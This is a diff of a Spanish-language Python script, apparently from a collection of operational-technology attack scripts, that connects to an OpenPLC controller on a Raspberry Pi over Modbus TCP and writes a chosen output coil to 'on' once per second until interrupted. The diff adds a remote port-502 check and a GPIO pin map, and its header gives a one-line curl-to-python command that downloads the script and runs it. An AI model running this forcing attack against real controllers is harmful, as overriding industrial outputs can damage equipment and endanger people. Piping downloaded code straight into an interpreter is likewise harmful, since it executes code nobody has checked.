@@ -6,7 +6,7 @@
 # No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.
 
 # ----------
-# Script de NiPeGun para instalar y configurar DVWA en Debian
+# Script de NiPeGun para forzar el encendido de las salidas de OpenPLC en la Raspberry Pi
 #
 # Ejecución remota:
 #   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - 192.168.1.100 '%QX0.1'
@@ -20,7 +20,8 @@
 
 import sys
 import time
-import subprocess
+import socket
+from pymodbus.client import ModbusTcpClient
 
 # Función para comprobar si pymodbus está instalado
 def check_pymodbus():
@@ -31,22 +32,17 @@ def check_pymodbus():
     print("  Instálalo con: sudo apt install python3-pymodbus \n")
     sys.exit(1)
 
-# Función para verificar si el servicio OpenPLC está activo
-def check_openplc():
+# Función para verificar si el puerto 502 de la Raspberry está abierto
+def check_openplc(ip):
   try:
-    result = subprocess.run(
-      ["systemctl", "is-active", "--quiet", "openplc"],
-      check=True
-    )
-    print("✅ OpenPLC está activo.")
-  except subprocess.CalledProcessError:
-    print("\n  Error: El puerto 502 de la raspberry no está escuchando conexioes Modbus.\n")
-    print("  Está OpenPLC activo? \n")
+    with socket.create_connection((ip, 502), timeout=5):
+      print(f"✅ OpenPLC está activo en {ip}.")
+  except (socket.timeout, ConnectionRefusedError):
+    print(f"\n  Error: El puerto 502 de {ip} no está escuchando conexiones Modbus.\n")
+    print("  ¿Está OpenPLC activo en la Raspberry Pi?\n")
     sys.exit(1)
 
-# Mapeo de pines OpenPLC a direcciones Modbus
-from pymodbus.client import ModbusTcpClient
-
+# Mapeo de pines OpenPLC a direcciones Modbus y a pines GPIO
 pin_map = {
   "%QX0.0": 0,
   "%QX0.1": 1,
@@ -61,20 +57,35 @@ pin_map = {
   "%QX1.2": 10
 }
 
+# Mapeo de pines OpenPLC a pines físicos de la Raspberry Pi
+gpio_map = {
+  "%QX0.0": 14,
+  "%QX0.1": 15,
+  "%QX0.2": 23,
+  "%QX0.3": 24,
+  "%QX0.4": 25,
+  "%QX0.5": 8,
+  "%QX0.6": 7,
+  "%QX0.7": 12,
+  "%QX1.0": 16,
+  "%QX1.1": 20,
+  "%QX1.2": 21
+}
+
 def activate_coil(ip, pin):
   if pin not in pin_map:
     print(f"Error: Pin {pin} no es válido. Usa uno de los siguientes: {', '.join(pin_map.keys())}")
     sys.exit(1)
 
   coil_address = pin_map[pin]  # Obtener dirección Modbus de la bobina
+  gpio_pin = gpio_map.get(pin, "Desconocido")
   client = ModbusTcpClient(ip, port=502)
 
   try:
     while True:
       client.write_coil(coil_address, True)
-      print(f"Bobina {pin} (Dirección {coil_address}) activada")
+      print(f"Bobina {pin} (Dirección {coil_address}) activada. GPIO correspondiente: {gpio_pin}")
       time.sleep(1)  # Intervalo de envío
-
   except KeyboardInterrupt:
     print("\nInterrumpido por el usuario. Cerrando conexión...")
   finally:
@@ -91,7 +102,6 @@ if __name__ == "__main__":
 
   # Verificar dependencias antes de continuar
   check_pymodbus()
-  check_openplc()
+  check_openplc(raspberry_ip)
 
   activate_coil(raspberry_ip, selected_pin)
-
